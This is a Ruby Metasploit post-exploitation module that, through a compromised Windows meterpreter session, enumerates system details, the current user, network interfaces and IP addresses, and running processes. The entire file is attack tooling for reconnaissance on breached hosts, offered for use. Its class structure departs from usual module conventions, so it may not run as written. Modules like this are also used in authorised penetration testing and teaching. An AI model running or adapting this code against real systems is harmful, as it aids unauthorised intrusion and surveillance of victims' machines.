require 'msf/core'

module Msf
	class Post < Msf::Post
		include Msf::Post::Common
		include Msf::Post::Windows::System
		include Msf::Post::Windows::Net

		def initialize(info = {})
			super(update_info(info,
				'Name' => 'Windows Information Gathering',
				'Description' => 'Get system informations, users, processus of a Windows target.',
				'Author' => ['KillianBHV'],
				'License' => MSF_LICENSE,
				'Platform' => ['win'],
				'SessionTypes' => ['meterpreter']
			))

			register_options(
				[
					OptInt.new('SESSION', [true, 'Session ID'])
				]
			)
		end

		def run
			session_id = datastore['SESSION']
			print_status("Information gathering with the session #{session_id}...")

			gather_system_info
			gather_user_info
			gather_network_info
			gather_running_processes
		end

		def gather_system_info
			print_status("Get system information...")
			sys_info = sysinfo
			print_good("Operating System: #{sys_info['OS']}")
			print_good("Hardware Name: #{sys_info['Computer']}")
		end

		def gather_user_info
			print_status("Get current user information...")
			user_info = session.sys.config.getuid
			print_good("Current user: #{user_info}")
		end

		def gather_network_info
			print_status("Get network information...")
			interfaces = session.net.config.interfaces
			interfaces.each do |interface|
				print_good("Interface: #{interface.name}")
				interface.addrs.each do |addr|
					print_good("  IP: #{addr.ip}" ) if addr.ip
					print_good("  Subnet Mask: #{addr.netmask}" ) if addr.netmask
				end
			end
		end

		def gather_running_processes
			print_status("Get running processes...")
			processes = session.sys.process.processes
			processes.each do |process|
				print_good("Process #{process['pid']} - #{process['name']}")
			end
		end
	end
end
